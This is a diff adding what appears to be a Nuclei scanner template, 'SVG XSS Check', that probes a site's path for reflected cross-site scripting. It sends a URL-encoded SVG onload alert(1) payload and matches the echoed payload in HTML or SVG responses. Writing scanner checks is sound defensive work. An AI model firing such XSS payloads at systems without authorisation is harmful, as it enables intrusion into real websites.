@@ -1,0 +1,31 @@
+id: xss-svg-path
+
+info:
+  name: SVG XSS Check
+  author: reewardius
+  reference: https://read.martiandefense.llc/a-zero-day-for-demo-servers-and-internal-government-networks-96acda9e83ed
+  severity: medium
+  tags: xss,generic
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{url_encode(</a>\"></script>\"><svg/onload=alert(1)>)}}"
+      
+    redirects: true
+    max-redirects: 1
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<svg/onload=alert(1)>"
+          - "<svg onload=alert(1)>"
+        part: body
+        condition: or
+        
+      - type: word
+        part: header
+        words:
+          - text/html
+          - image/svg+xml
+        condition: or
